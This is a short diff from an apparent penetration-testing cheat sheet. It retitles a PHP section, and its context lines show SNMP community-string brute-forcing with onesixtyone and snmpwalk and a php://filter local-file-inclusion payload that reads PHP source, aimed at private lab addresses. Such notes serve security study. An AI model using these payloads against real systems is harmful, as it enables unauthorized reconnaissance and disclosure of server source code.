@@ -424,8 +424,8 @@ onesixtyone -c /usr/share/wordlists/dirb/small.txt 192.168.1.200  // find commun
 for i in $(cat /usr/share/wordlists/metasploit/unix_users.txt);do snmpwalk -v 1 -c $i 192.168.1.200;done| grep -e "Timeout" // find communities with bruteforce
 
 
- == PHP ==
-## Read PHP source code with php://filter
+## == PHP ==
+Read PHP source code with php://filter
 http://192.168.56.129/?page=upload   // original page
 http://192.168.0.105/?page=php://filter/convert.base64-encode/resource=upload
 curl http://192.168.0.105/?page=php://filter/convert.base64-encode/resource=upload
